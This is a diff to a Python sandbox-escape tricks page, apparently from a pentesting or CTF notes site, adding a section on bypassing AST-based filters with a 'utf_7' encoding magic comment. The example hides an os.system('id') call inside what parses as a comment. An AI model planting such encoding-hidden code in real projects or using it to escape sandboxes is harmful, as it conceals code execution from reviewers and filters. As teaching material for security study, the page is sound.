@@ -4,10 +4,6 @@ description: Some tricks specific to the Python language
 
 # Python
 
-{% content-ref url="web-frameworks/flask.md" %}
-[flask.md](web-frameworks/flask.md)
-{% endcontent-ref %}
-
 ## Filter Bypass
 
 If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.&#x20;
@@ -407,6 +403,46 @@ If a **shorter** payload (fewer bytes) is needed, you can mix and match these Un
 {% hint style="info" %}
 See [this site](https://gosecure.github.io/unicode-pentester-cheatsheet/) for a table of all Unicode transformations, as this trick is far from the only one. Look for "Normalization NFKC" as Python uses it for resolving function names
 {% endhint %}
+
+#### AST Bypass using magic comment
+
+When your payload is stored as a file and run, instead of just being evaluated, it is interpreted as a _module_. This small difference adds a possible trick using [**magic comments**](https://docs.python.org/3/reference/lexical\_analysis.html#encoding-declarations) that define an encoding for the rest of the file. A [list of languages can be found here](https://docs.python.org/3/library/codecs.html#standard-encodings), which includes odd ones like `unicode_escape`, `unicode_escape_raw` or `utf_7`. ([read writeup](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy))
+
+These can be abused in an AST scenario because comments are ignored while parsing, and it assumes UTF-8. With this, we can add a hidden newline after a comment to insert more code, while in UTF-8 this newline will be seen as part of the comment and is ignored while parsing the AST.&#x20;
+
+Take the following example:
+
+{% code title="Payload" %}
+```python
+# coding: utf_7
+def f(x):
+    return x
+    #+AAo-__import__("os").system("id")
+```
+{% endcode %}
+
+This executes the `id` shell command when run, while it looks like it only defines a function:
+
+{% code title="AST Representation" %}
+```python
+Module(
+    body=[
+        FunctionDef(
+            name='f',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='x')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Return(
+                    value=Name(id='x', ctx=Load()))],
+            decorator_list=[])],
+    type_ignores=[])
+```
+{% endcode %}
 
 ### Overwriting variables
 
